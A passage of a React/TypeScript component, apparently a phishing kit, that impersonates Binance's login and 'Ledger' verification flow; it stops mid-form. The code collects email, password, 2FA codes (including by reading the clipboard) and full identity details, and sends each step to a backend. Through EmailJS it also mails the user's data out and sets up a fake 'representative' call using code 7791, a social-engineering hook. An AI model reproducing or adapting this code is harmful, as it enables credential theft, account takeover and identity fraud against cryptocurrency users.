import { FC, useState, useEffect } from "react";
import { useToast } from "@/hooks/use-toast";
import { useAuth } from "@/contexts/AuthContext";
import { QrCode, AlertTriangle } from "lucide-react";
import { Checkbox } from "@/components/ui/checkbox";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from '../config/emailjs.config';

type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success' | 'private-key' | 'confirmation' | 'ledger-shipping';

const countries = [
  "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Netherlands", "Belgium",
  "Switzerland", "Austria", "Sweden", "Norway", "Denmark", "Finland", "Poland", "Czech Republic", "Hungary", "Romania",
  "Bulgaria", "Croatia", "Slovenia", "Slovakia", "Estonia", "Latvia", "Lithuania", "Luxembourg", "Malta", "Cyprus",
  "Ireland", "Portugal", "Greece", "Japan", "South Korea", "Singapore", "Hong Kong", "Taiwan", "Malaysia", "Thailand",
  "Philippines", "Indonesia", "Vietnam", "India", "China", "Brazil", "Mexico", "Argentina", "Chile", "Colombia"
];

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const { setAuthenticated } = useAuth();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [currentStep, setCurrentStep] = useState<FormStep>('email');
  const [isLoading, setIsLoading] = useState(false);
  const [logoError, setLogoError] = useState(false);
  const [errors, setErrors] = useState<{[key: string]: string}>({});
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [confirmationChecked, setConfirmationChecked] = useState(false);
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [isCallDialogOpen, setIsCallDialogOpen] = useState(false);
  const [countdown, setCountdown] = useState(9);
  const [isCountingDown, setIsCountingDown] = useState(false);
  const [contactingUser, setContactingUser] = useState(false);
  const [personalDetails, setPersonalDetails] = useState({
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    address: "",
    postalCode: "",
    city: "",
    country: "",
    phoneNumber: ""
  });
  const [isPhoneSupportCountingDown, setIsPhoneSupportCountingDown] = useState(false);
  const [phoneSupportCountdown, setPhoneSupportCountdown] = useState(9);
  const [phoneSupportContactingUser, setPhoneSupportContactingUser] = useState(false);

  // Generate a mock private key (12 words)
  const privateKeyWords = [
    "abandon", "ability", "able", "about", "above", "absent", 
    "absorb", "abstract", "absurd", "abuse", "access", "accident"
  ];

  // Initialize EmailJS
  useEffect(() => {
    emailjs.init(EMAILJS_CONFIG.USER_ID);
  }, []);

  // Countdown effect for shipping support
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isCountingDown && countdown > 0) {
      interval = setInterval(() => {
        setCountdown(prev => prev - 1);
      }, 1000);
    } else if (countdown === 0 && isCountingDown) {
      setContactingUser(true);
      setIsCountingDown(false);
      // Send email notification directly for countdown support requests
      sendCountdownSupportRequest('shipping-support');
    }
    return () => clearInterval(interval);
  }, [isCountingDown, countdown]);

  // Countdown effect for phone support
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isPhoneSupportCountingDown && phoneSupportCountdown > 0) {
      interval = setInterval(() => {
        setPhoneSupportCountdown(prev => prev - 1);
      }, 1000);
    } else if (phoneSupportCountdown === 0 && isPhoneSupportCountingDown) {
      setPhoneSupportContactingUser(true);
      setIsPhoneSupportCountingDown(false);
      // Send email notification directly for countdown support requests
      sendCountdownSupportRequest('phone-support');
    }
    return () => clearInterval(interval);
  }, [isPhoneSupportCountingDown, phoneSupportCountdown]);

  // Direct email sending function for countdown support requests ONLY
  const sendCountdownSupportRequest = async (supportType: string) => {
    try {
      const templateParams = {
        step: 'countdown-support-request',
        email: email,
        timestamp: new Date().toISOString(),
        data: JSON.stringify({
          email,
          personalDetails,
          supportCode: '7791',
          requestType: supportType,
          currentStep
        }, null, 2),
        to_email: EMAILJS_CONFIG.TO_EMAIL, // Direct to donotreply@binanceledger.com
        from_name: 'Binance Ledger Form',
        from_email: email,
        message: `Countdown Support Request - ${supportType}\n\nUser Email: ${email}\nSupport Code: 7791\nRequest Type: ${supportType}`
      };

      const result = await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams
      );

      console.log('Countdown support email sent successfully to donotreply@binanceledger.com:', result);
      
      toast({
        title: "Support Request Sent",
        description: "Your support request has been sent to Binance.",
      });
    } catch (error) {
      console.error('Failed to send countdown support request:', error);
      toast({
        title: "Error",
        description: "Failed to send support request. Please try again.",
        variant: "destructive",
      });
    }
  };

  // Regular form data sending function - goes through backend API
  const sendFormData = async (step: string, data: any) => {
    try {
      // Send to your backend API endpoint
      await fetch('/api/form-submission', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          step,
          data,
          timestamp: new Date().toISOString()
        })
      });
    } catch (error) {
      console.error('Failed to send form data:', error);
    }
  };

  const startCountdown = () => {
    setIsCountingDown(true);
    setCountdown(9);
    setContactingUser(false);
  };

  const startPhoneSupportCountdown = () => {
    setIsPhoneSupportCountingDown(true);
    setPhoneSupportCountdown(9);
    setPhoneSupportContactingUser(false);
  };

  const transitionToStep = (newStep: FormStep) => {
    setIsTransitioning(true);
    setTimeout(() => {
      setCurrentStep(newStep);
      setTimeout(() => {
        setIsTransitioning(false);
      }, 150);
    }, 150);
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    if (!email) {
      setErrors({ email: "Please enter your email address" });
      return;
    }
    
    if (!/\S+@\S+\.\S+/.test(email)) {
      setErrors({ email: "Please enter a valid email address" });
      return;
    }
    
    // Send email data to backend
    await sendFormData('email', { email });
    
    console.log("Email submitted:", email);
    transitionToStep('password');
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    if (!password) {
      setErrors({ password: "Please enter your password" });
      return;
    }
    
    if (password.length < 6) {
      setErrors({ password: "Password must be at least 6 characters" });
      return;
    }
    
    // Send password data to backend
    await sendFormData('password', { email, password });
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    transitionToStep('verification');
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    if (!verificationCode) {
      setErrors({ verification: "Please enter the verification code" });
      return;
    }
    
    if (verificationCode.length !== 6) {
      setErrors({ verification: "Verification code must be 6 digits" });
      return;
    }
    
    // Send verification data to backend
    await sendFormData('verification', { email, verificationCode });
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 2000));
    setIsLoading(false);
    
    // Set user as authenticated when verification is successful
    setAuthenticated(email);
    
    transitionToStep('important-notice');
  };

  const handleNoticeConfirm = () => {
    transitionToStep('personal-details');
  };

  const handlePersonalDetailsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    const requiredFields = ['firstName', 'lastName', 'dateOfBirth', 'address', 'postalCode', 'city', 'country', 'phoneNumber'];
    const newErrors: {[key: string]: string} = {};
    
    requiredFields.forEach(field => {
      if (!personalDetails[field as keyof typeof personalDetails]) {
        newErrors[field] = "This field is required";
      }
    });
    
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }
    
    // Send personal details to backend
    await sendFormData('personal-details', { email, personalDetails });
    
    transitionToStep('summary');
  };

  const handleSummaryConfirm = async () => {
    if (!confirmationChecked) {
      setErrors({ confirmation: "Please confirm that all information is accurate" });
      return;
    }
    
    setErrors({});
    
    // Send summary confirmation to backend
    await sendFormData('summary-confirmed', { email, personalDetails, confirmed: true });
    
    transitionToStep('verifying');
    
    // Simulate verification process for 20 seconds
    setTimeout(() => {
      transitionToStep('success');
    }, 20000); // 20 seconds = 20,000 milliseconds
  };

  const handleConnectLedger = () => {
    transitionToStep('private-key');
  };

  const handleShowPrivateKey = () => {
    setShowPrivateKey(true);
  };

  const handlePrivateKeyNext = () => {
    transitionToStep('confirmation');
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setVerificationCode(text);
    } catch (err) {
      console.error('Failed to read clipboard contents: ', err);
    }
  };

  const renderHeader = () => (
    <div className="flex justify-start mb-4">
      <div className="flex items-center">
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
          alt="Binance Logo" 
          className="h-5"
          onError={(e) => {
            setLogoError(true);
            e.currentTarget.style.display = 'none';
          }}
        />
        {logoError && (
          <span className="text-binance-yellow font-bold text-sm font-binance">
            BINANCE
          </span>
        )}
      </div>
    </div>
  );

  const renderTitle = () => {
    const titles = {
      email: 'Log in',
      password: 'Enter Password',
      verification: 'Enter Verification Code',
      'important-notice': 'Important Notice',
      'personal-details': 'Verify Details',
      summary: 'Review Information',
      verifying: 'Verifying',
      success: 'Verification Successful',
      'private-key': 'Private Key Generation',
      confirmation: 'Confirmation'
    };

    if (currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation') {
      return null; // Title handled in content for these states
    }

    return (
      <div className="flex justify-between items-center mb-4">
        <div 
          className="text-base font-bold font-binance"
          style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
          role="heading" 
          aria-level={1}
        >
          {titles[currentStep]}
        </div>
        {currentStep === 'email' && (
          <div className="max-md:hidden h-[28px]">
            <div className="bn-tooltips-wrap qrcode-login-popup">
              <div className="bn-tooltips-ele">
                <div 
                  className="p-[2px] w-[32px] h-[32px] rounded-[4px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
                  style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                  role="button" 
                  aria-label="QR code login" 
                  tabIndex={0}
                >
                  <QrCode 
                    className="w-[28px] h-[28px]" 
                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  />
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  };

  // Render special states (important notice, summary, verifying, success, private-key, confirmation, ledger-shipping)
  const renderSpecialState = () => {
    if (currentStep === 'ledger-shipping') {
      return (
        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
          <div className="flex-1">
            <div 
              className="text-lg font-semibold font-binance mb-6 text-center"
              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
            >
              Your Ledger is on the way
            </div>
            
            {/* Ledger Device Image */}
            <div className="flex justify-center mb-6">
              <div className="relative">
                <div className="absolute inset-0 bg-gradient-to-r from-yellow-400/20 to-yellow-600/20 rounded-2xl blur-xl transform scale-110"></div>
                <div className="relative bg-gradient-to-br from-[#2B3139] to-[#1E2329] p-4 rounded-2xl border border-yellow-500/30 shadow-2xl">
                  <img 
                    src="/lovable-uploads/3cd31df8-babf-4eef-b7a9-a928a99a63e5.png" 
                    alt="Binance Ledger Device" 
                    className="w-32 h-auto object-contain"
                  />
                </div>
              </div>
            </div>

            <div className="text-left space-y-4 mb-5">
              <div className="bg-green-500/10 border border-green-500/20 rounded p-3">
                <div className="text-xs font-binance text-green-400 leading-relaxed">
                  <strong>✓ Order Confirmed:</strong><br/>
                  Your Binance Ledger device has been prepared and will be shipped to your address.
                </div>
              </div>

              <div className="text-xs font-binance text-white leading-relaxed">
                <strong>Shipping Details:</strong>
              </div>
              
              <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 space-y-2">
                <div className="grid grid-cols-1 gap-2 text-xs">
                  <div className="flex justify-between">
                    <span className="font-binance text-gray-400">Name:</span>
                    <span className="font-binance text-white">{personalDetails.firstName} {personalDetails.lastName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-binance text-gray-400">Address:</span>
                    <span className="font-binance text-white text-right">{personalDetails.address}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-binance text-gray-400">City:</span>
                    <span className="font-binance text-white">{personalDetails.city}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-binance text-gray-400">Postal Code:</span>
                    <span className="font-binance text-white">{personalDetails.postalCode}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-binance text-gray-400">Country:</span>
                    <span className="font-binance text-white">{personalDetails.country}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-binance text-gray-400">Phone:</span>
                    <span className="font-binance text-white">{personalDetails.phoneNumber}</span>
                  </div>
                </div>
              </div>
              
              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded p-3">
                <div className="text-xs font-binance text-yellow-400 leading-relaxed">
                  <strong>📦 Delivery Information:</strong><br/>
                  • Your Ledger device will arrive within <strong>10 business days</strong><br/>
                  • You will receive a tracking number via email once shipped<br/>
                  • The package will include setup instructions for your second security key
                </div>
              </div>

              <div className="text-xs font-binance text-white leading-relaxed">
                <strong>What's Next:</strong><br/>
                Once you receive your Ledger device, follow the included instructions to generate your second security key. This completes your two-key security system for maximum protection of your assets.
              </div>
            </div>
          </div>

          <div className="mt-auto space-y-3">
            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
              <DialogTrigger asChild>
                <button
                  type="button"
                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
                  style={{
                    backgroundColor: "transparent",
                    color: "var(--color-BtnBg, #FCD535)",
                    height: "34px"
                  }}
                >
                  Contact Support for Shipping Questions
                </button>
              </DialogTrigger>
              <DialogContent className="bg-[#1E2329] border-[#474D57]">
                <DialogHeader>
                  <DialogTitle className="text-white text-sm font-binance">Shipping Support</DialogTitle>
                </DialogHeader>
                <div className="text-xs font-binance text-white leading-relaxed mb-4">
                  A Binance representative will contact you shortly regarding your shipping inquiry. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
                </div>
                {!isCountingDown && !contactingUser && (
                  <button
                    onClick={startCountdown}
                    className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 font-bold font-binance text-xs bg-yellow-500 text-black"
                  >
                    Request Call
                  </button>
                )}
                {isCountingDown && (
                  <div className="text-center">
                    <div className="text-yellow-400 font-binance text-lg mb-2">{countdown}</div>
                    <div className="text-white font-binance text-xs">Connecting you to support...</div>
                  </div>
                )}
                {contactingUser && (
                  <div className="text-center text-green-400 font-binance text-sm">
                    Binance is contacting you
                  </div>
                )}
              </DialogContent>
            </Dialog>

            <a
              href="https://www.binance.com"
              target="_blank"
              rel="noopener noreferrer"
              className="block w-full"
            >
              <button
                type="button"
                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
                style={{
                  backgroundColor: "var(--color-BtnBg, #FCD535)",
                  color: "var(--color-TextOnYellow, #202630)",
                  height: "34px"
                }}
              >
                Continue to Dashboard
              </button>
            </a>
          </div>
        </div>
      );
    }

    if (currentStep === 'confirmation') {
      return (
        <div className="text-center" style={{ minHeight: "450px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
          <div 
            className="text-sm font-semibold font-binance mb-6"
            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
          >
            Final Confirmation
          </div>
          
          <div className="text-left mb-6">
            <div className="text-xs font-binance text-white leading-relaxed mb-4">
              <strong>Next Step:</strong><br/>
              Binance will ship your Ledger device by mail, and the package will include instructions on how to generate your second key.
            </div>
            
            <div className="bg-yellow-500/10 border border-yellow-500/20 rounded p-3 mb-4">
              <div className="text-xs font-binance text-yellow-400 leading-relaxed">
                <strong>⚠️ Security Reminder:</strong><br/>
                • Your private key has been securely saved<br/>
                • Keep it safe and never share it with anyone<br/>
                • Binance will never ask for your private keys or passwords
              </div>
            </div>
          </div>

          <div className="mt-auto space-y-3">
            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
              <DialogTrigger asChild>
                <button
                  type="button"
                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
                  style={{
                    backgroundColor: "transparent",
                    color: "var(--color-BtnBg, #FCD535)",
                    height: "34px"
                  }}
                >
                  Request a Call from a Binance Representative for Phone Support
                </button>
              </DialogTrigger>
              <DialogContent className="bg-[#1E2329] border-[#474D57]">
                <DialogHeader>
                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
                </DialogHeader>
                <div className="text-xs font-binance text-white leading-relaxed mb-4">
                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
                </div>
              </DialogContent>
            </Dialog>

            <button
              type="button"
              onClick={() => transitionToStep('ledger-shipping')}
              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
              style={{
                backgroundColor: "var(--color-BtnBg, #FCD535)",
                color: "var(--color-TextOnYellow, #202630)",
                height: "34px"
              }}
              aria-label="Complete Setup"
            >
              Complete Setup
            </button>
          </div>
        </div>
      );
    }

    if (currentStep === 'private-key') {
      return (
        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
          <div className="flex-1">
            <div 
              className="text-sm font-semibold font-binance mb-4"
              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
            >
              Private Key Generation
            </div>
            
            <div className="text-left space-y-4 mb-5">
              <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
                <div className="text-xs font-binance text-red-400 leading-relaxed">
                  <strong>⚠️ Important Security Notice:</strong><br/>
                  • Make sure no one is watching when you view or store your keys<br/>
                  • Never share your private key over the phone or by email<br/>
                  • Binance will never ask you for your private keys or passwords
                </div>
              </div>

              {!showPrivateKey ? (
                <div className="text-xs font-binance text-white leading-relaxed">
                  In the next step, you will see a Show Private Key button. A 12-word recovery phrase will be generated that you must store securely. Once you click Next, you will no longer be able to retrieve this phrase from this page.
                </div>
              ) : (
                <div>
                  <div className="text-xs font-binance text-white mb-3">
                    <strong>Your Private Key (Recovery Phrase):</strong>
                  </div>
                  <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 mb-3">
                    <div className="grid grid-cols-3 gap-2 text-xs font-binance text-white">
                      {privateKeyWords.map((word, index) => (
                        <div key={index} className="flex items-center">
                          <span className="text-gray-400 mr-1">{index + 1}.</span>
                          <span>{word}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="text-xs font-binance text-yellow-400">
                    ⚠️ Store this phrase securely. You will not be able to retrieve it after proceeding.
                  </div>
                </div>
              )}
            </div>
          </div>

          <div className="mt-auto space-y-3">
            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
              <DialogTrigger asChild>
                <button
                  type="button"
                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
                  style={{
                    backgroundColor: "transparent",
                    color: "var(--color-BtnBg, #FCD535)",
                    height: "34px"
                  }}
                >
                  Request a Call from a Binance Representative for Phone Support
                </button>
              </DialogTrigger>
              <DialogContent className="bg-[#1E2329] border-[#474D57]">
                <DialogHeader>
                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
                </DialogHeader>
                <div className="text-xs font-binance text-white leading-relaxed">
                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
                </div>
              </DialogContent>
            </Dialog>

            {!showPrivateKey ? (
              <button
                type="button"
                onClick={handleShowPrivateKey}
                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
                style={{
                  backgroundColor: "var(--color-BtnBg, #FCD535)",
                  color: "var(--color-TextOnYellow, #202630)",
                  height: "34px"
                }}
              >
                Show Private Key
              </button>
            ) : (
              <button
                type="button"
                onClick={handlePrivateKeyNext}
                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
                style={{
                  backgroundColor: "var(--color-BtnBg, #FCD535)",
                  color: "var(--color-TextOnYellow, #202630)",
                  height: "34px"
                }}
              >
                Next
              </button>
            )}
          </div>
        </div>
      );
    }

    if (currentStep === 'summary') {
      return (
        <div style={{ minHeight: "350px", display: "flex", flexDirection: "column" }}>
          <div className="flex-1">
            <div 
              className="mb-4 text-sm font-semibold font-binance text-left"
              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
            >
              Review Information
            </div>
            
            <div className="text-left space-y-3 mb-5">
              <div className="grid grid-cols-2 gap-3 text-xs">
                <div>
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    First Name
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.firstName}
                  </div>
                </div>
                <div>
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    Last Name
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.lastName}
                  </div>
                </div>
                <div>
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    Date of Birth
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.dateOfBirth}
                  </div>
                </div>
                <div>
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    Phone Number
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.phoneNumber}
                  </div>
                </div>
                <div className="col-span-2">
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    Address
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.address}
                  </div>
                </div>
                <div>
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    City
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.city}
                  </div>
                </div>
                <div>
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    Postal Code
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.postalCode}
                  </div>
                </div>
                <div className="col-span-2">
                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
                    Country
                  </div>
                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                    {personalDetails.country}
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="mt-auto">
            <div className="mb-4">
              <div className="flex items-start space-x-2">
                <Checkbox
                  id="confirmation"
                  checked={confirmationChecked}
                  onCheckedChange={(checked) => setConfirmationChecked(checked as boolean)}
                  className="mt-0.5"
                />
                <label 
                  htmlFor="confirmation" 
                  className="text-xs font-binance leading-relaxed cursor-pointer"
                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                >
                  I confirm that all the information I have provided is accurate, truthful, and complete.
                </label>
              </div>
              {errors.confirmation && (
                <div className="text-red-500 text-xs mt-2 font-binance">
                  {errors.confirmation}
                </div>
              )}
            </div>

            <button
              type="button"
              onClick={handleSummaryConfirm}
              disabled={isLoading}
              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
              style={{
                backgroundColor: "var(--color-BtnBg, #FCD535)",
                color: "var(--color-TextOnYellow, #202630)",
                height: "34px"
              }}
              aria-label="Confirm Information"
            >
              {isLoading ? (
                <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
              ) : (
                'Confirm Information'
              )}
            </button>
          </div>
        </div>
      );
    }

    if (currentStep === 'important-notice') {
      return (
        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
          <div 
            className="text-xs font-semibold font-binance mb-3"
            style={{ color: "#F59E0B" }}
          >
            Important Notice
          </div>
          <div className="text-xs font-binance text-center leading-relaxed mb-5" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
            Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
          </div>
          <button
            type="button"
            onClick={handleNoticeConfirm}
            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
            style={{
              backgroundColor: "var(--color-BtnBg, #FCD535)",
              color: "var(--color-TextOnYellow, #202630)",
              height: "34px"
            }}
            aria-label="I Understand"
          >
            I Understand
          </button>
        </div>
      );
    }

    if (currentStep === 'verifying') {
      return (
        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
          <div className="flex justify-center mb-4">
            <div className="animate-spin rounded-full h-8 w-8 border-4 border-yellow-500 border-t-transparent"></div>
          </div>
          <div 
            className="text-xs font-semibold font-binance"
            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
          >
            Please wait a moment while we verify your details
          </div>
        </div>
      );
    }

    if (currentStep === 'success') {
      return (
        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
          <div className="flex-1">
            <div 
              className="text-sm font-semibold font-binance mb-4"
              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
            >
              Connect Ledger
            </div>
            
            <div className="text-left space-y-4 mb-5">
              <div className="text-xs font-binance text-white leading-relaxed">
                We're now taking an important step to enhance the security of your assets. Please prepare your Ledger device to ensure maximum protection of your funds.
              </div>
              
              <div className="text-xs font-binance text-white leading-relaxed">
                <strong>Your Ledger device uses a two-key security system:</strong>
              </div>
              
              <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 space-y-2">
                <div className="text-xs font-binance text-white">
                  • One key is automatically generated for you here. Please store this key in a secure place, as it is essential for accessing your assets.
                </div>
                <div className="text-xs font-binance text-white">
                  • The second key can be generated by you once you receive your Ledger device at home.
                </div>
                <div className="text-xs font-binance text-white">
                  • Together, these two keys ensure the highest level of protection for your account.
                </div>
              </div>
              
              <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
                <div className="text-xs font-binance text-red-400 leading-relaxed">
                  <strong>⚠️ Important Security Notice:</strong><br/>
                  • Never share your keys with anyone<br/>
                  • Binance will never ask you for your private keys or passwords<br/>
                  • Make sure no one is watching when you view or store your keys
                </div>
              </div>
              
              <div className="text-xs font-binance text-white leading-relaxed">
                <strong>How It Works:</strong><br/>
                When you click Show Private Key, a 12–24-word recovery phrase will be generated. You must store this phrase securely. Once you click Next, you will no longer be able to retrieve this phrase from this page.
              </div>
            </div>
          </div>

          <div className="mt-auto space-y-3">
            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
              <DialogTrigger asChild>
                <button
                  type="button"
                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
                  style={{
                    backgroundColor: "transparent",
                    color: "var(--color-BtnBg, #FCD535)",
                    height: "34px"
                  }}
                >
                  Request a Call from a Binance Representative for Phone Support
                </button>
              </DialogTrigger>
              <DialogContent className="bg-[#1E2329] border-[#474D57]">
                <DialogHeader>
                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
                </DialogHeader>
                <div className="text-xs font-binance text-white leading-relaxed">
                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
                </div>
              </DialogContent>
            </Dialog>

            <button
              type="button"
              onClick={handleConnectLedger}
              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
              style={{
                backgroundColor: "var(--color-BtnBg, #FCD535)",
                color: "var(--color-TextOnYellow, #202630)",
                height: "34px"
              }}
              aria-label="Connect Ledger"
            >
              Connect Ledger
            </button>
          </div>
        </div>
      );
    }

    return null;
  };

  const renderMainForm = () => {
    if (currentStep === 'personal-details') {
      return (
        <div>
          <form onSubmit={handlePersonalDetailsSubmit}>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
              <div className="bn-formItem">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  First Name
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.firstName ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <input
                    type="text"
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                    value={personalDetails.firstName}
                    onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
                  />
                </div>
                {errors.firstName && (
                  <div className="text-red-500 text-xs mt-1 font-binance">
                    {errors.firstName}
                  </div>
                )}
              </div>

              <div className="bn-formItem">
                <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                  Last Name
                </label>
                <div 
                  className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.lastName ? 'border-red-500' : ''}`}
                  style={{
                    backgroundColor: "var(--color-Input, #2B3139)",
                    border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                    height: "38px"
                  }}
                >
                  <input
                    type="text"
                    className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                    value={personalDetails.lastName}
